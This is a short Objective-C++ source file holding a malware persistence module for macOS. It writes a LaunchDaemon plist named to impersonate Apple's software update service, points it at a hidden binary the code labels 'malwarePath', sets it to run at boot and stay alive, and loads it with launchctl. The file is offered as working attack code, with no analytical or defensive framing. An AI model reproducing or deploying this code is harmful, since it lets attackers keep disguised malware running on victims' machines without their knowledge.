#import <Foundation/Foundation.h>
#include <iostream>
#include <string>
#include <spawn.h>

extern char **environ;

namespace PersistenceModule {
    class Anchor {
    public:
        bool establish_persistence() {
            NSString *malwarePath = @"/var/root/.sysd"; 
            NSString *plistPath = @"/Library/LaunchDaemons/com.apple.softwareupdated.plist";

            NSMutableDictionary *plistDict = [[NSMutableDictionary alloc] init];
            [plistDict setObject:@"com.apple.softwareupdated" forKey:@"Label"];
            [plistDict setObject:@[malwarePath] forKey:@"ProgramArguments"];
            [plistDict setObject:[NSNumber numberWithBool:YES] forKey:@"RunAtLoad"];
            [plistDict setObject:[NSNumber numberWithBool:YES] forKey:@"KeepAlive"];

            BOOL success = [plistDict writeToFile:plistPath atomically:YES];
            
            if (success) {
                [[NSFileManager defaultManager] setAttributes:@{NSFilePosixPermissions: @0644} ofItemAtPath:plistPath error:nil];
                
                pid_t pid;
                char *argv[] = { (char*)"launchctl", (char*)"load", (char*)[plistPath UTF8String], NULL };
                posix_spawn(&pid, "/bin/launchctl", NULL, NULL, argv, environ);
                return true;
            }
            return false;
        }
    };
}